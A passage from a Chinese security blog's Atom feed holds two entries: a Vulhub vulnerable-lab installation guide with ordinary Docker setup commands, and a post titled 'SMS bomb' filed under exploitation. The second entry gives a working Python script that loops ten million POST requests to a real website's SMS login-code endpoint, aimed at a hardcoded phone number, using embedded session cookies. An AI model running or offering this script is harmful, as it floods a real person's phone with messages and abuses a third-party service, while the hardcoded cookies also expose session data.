    <content type="html"><![CDATA[<h2 id="Vulhub"><a href="#Vulhub" class="headerlink" title="Vulhub"></a>Vulhub</h2><blockquote><p>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。</p></blockquote><h2 id="在ubuntu16-04下安装-官网介绍"><a href="#在ubuntu16-04下安装-官网介绍" class="headerlink" title="在ubuntu16.04下安装(官网介绍)"></a>在ubuntu16.04下安装(官网介绍)</h2><h4 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python3</span><br></pre></td></tr></table></figure><h4 id="安装最新版docker"><a href="#安装最新版docker" class="headerlink" title="安装最新版docker"></a>安装最新版docker</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><h4 id="启动docker服务"><a href="#启动docker服务" class="headerlink" title="启动docker服务"></a>启动docker服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><h4 id="安装compose"><a href="#安装compose" class="headerlink" title="安装compose"></a>安装compose</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install docker-compose</span><br></pre></td></tr></table></figure><p><em>我安装的时候发现需要：</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt  install docker-compose</span><br></pre></td></tr></table></figure></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h4 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line">cd vulhub-master</span><br></pre></td></tr></table></figure><h4 id="进入某一个漏洞-环境的目录"><a href="#进入某一个漏洞-环境的目录" class="headerlink" title="进入某一个漏洞/环境的目录"></a>进入某一个漏洞/环境的目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd flask/ssti</span><br></pre></td></tr></table></figure><h4 id="自动化编译环境"><a href="#自动化编译环境" class="headerlink" title="自动化编译环境"></a>自动化编译环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure><h4 id="启动整个环境"><a href="#启动整个环境" class="headerlink" title="启动整个环境"></a>启动整个环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="编译失败解决方法"><a href="#编译失败解决方法" class="headerlink" title="编译失败解决方法"></a>编译失败解决方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jing@ubuntu:/tmp/docker$ sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">jing@ubuntu:/tmp/docker$ sudo su </span><br><span class="line">root@ubuntu:/tmp/docker$ su jing </span><br><span class="line">jing@ubuntu:/tmp/docker$ docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker attach weblogic</span><br><span class="line"></span><br><span class="line">docker-compose exec weblogic bash</span><br></pre></td></tr></table></figure><h2 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctrl+p+q</span><br><span class="line">或</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h2 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Vulhub&quot;&gt;&lt;a href=&quot;#Vulhub&quot; class=&quot;headerlink&quot; title=&quot;Vulhub&quot;&gt;&lt;/a&gt;Vulhub&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即
      
    
    </summary>
    
      <category term="技术指南" scheme="txf7.xyz/categories/%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>python之短信炸弹</title>
    <link href="txf7.xyz/2018/08/12/%E7%9F%AD%E4%BF%A1%E7%82%B8%E5%BC%B9/"/>
    <id>txf7.xyz/2018/08/12/短信炸弹/</id>
    <published>2018-08-12T12:00:07.000Z</published>
    <updated>2019-01-12T13:45:50.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="短信接口"><a href="#短信接口" class="headerlink" title="短信接口"></a>短信接口</h2><p><img src="https://upload-images.jianshu.io/upload_images/14134003-36a04c6cb3c260ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h2 id="python3利用代码"><a href="#python3利用代码" class="headerlink" title="python3利用代码"></a>python3利用代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header = &#123;    </span><br><span class="line">            &apos;User-Agent&apos;  : &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&apos;,</span><br><span class="line">            &quot;Referer&quot;: &quot;https://zaozao.uc.cn/wm/?wm_st=1.2433b59544c645b8bd35e599999fbc89&quot;&#125;</span><br><span class="line"></span><br><span class="line">cookie = &#123;&apos;_UP_L_&apos;:&apos;zh;&apos;,</span><br><span class="line">            &apos;_UP_F7E_8D_&apos;:&apos;3%2F0Who5ZdC74lxjVJY7DD0PwKLOVbxJPcg0RzQPI6KmBtV6ZMgPh38l93pgubgHDQqhaZ2Sfc0qv%2BRantbfg1mWGAUpRMP4RqXP78Wvu%2FCfvkWWGc5NhCTV71tGOIGgDBR3%2Bu6%2Fjj44DXkBon7E867ln30oYoMozdjkhOclrgipqYAbrjqRo9YuUE9%2Fs5crDh4UEaUwcuagIrOYL%2Bdk%2BidOC3XldiVSc58aiBhq4LS2WW1p4rCuiSyU1VZu4DtwRoAg3J36dS9aj1m9P204NQdNf5Nyo3ldtw6TWtrcg0yJducQVbH%2BT5yM6TQ0ySWQ88mFyMhj2VouQ%2B%2BFKM%2B0tL1ggY93VJqD%2BpMQFMmRjkZcU4AeB7NfZ1w%3D%3D;&apos;,</span><br><span class="line">            &apos;_UP_A4A_11_&apos;:&apos;wb76d1cb59ab4526ae123a7d348152cd;&apos;,</span><br><span class="line">            &apos;_UP_D_&apos; : &apos;pc;&apos;,</span><br><span class="line">            &apos;sm_uuid&apos; : &apos;036beee0eb8ee62c46c6ad2f34274b6f%7C%7C%7C1547268216;&apos;,</span><br><span class="line">            &apos;sm_diu&apos; : &apos;036beee0eb8ee62c46c6ad2f34274b6f%7C%7C11eeeeee4d286169f6%7C1547268216;&apos;,</span><br><span class="line">            &apos;PHPSESSID&apos; : &apos;1877qmq2msnq6cim3l0rojkti1&apos;&#125;            </span><br><span class="line">s=10000000</span><br><span class="line">for _ in range(s):</span><br><span class="line">    r = requests.post(url=&apos;http://zaozao.uc.cn/wm/User/sendSmsCodeForLogin?mobile=15017348578&apos;,cookies=cookie,headers=header)</span><br><span class="line">    #发送post请求</span><br><span class="line">    print(r.text)</span><br><span class="line">    time.sleep(60)</span><br><span class="line">    # 延迟60秒</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;短信接口&quot;&gt;&lt;a href=&quot;#短信接口&quot; class=&quot;headerlink&quot; title=&quot;短信接口&quot;&gt;&lt;/a&gt;短信接口&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/14134
      
    
    </summary>
    
      <category term="漏洞利用" scheme="txf7.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
  </entry>
  
</feed>
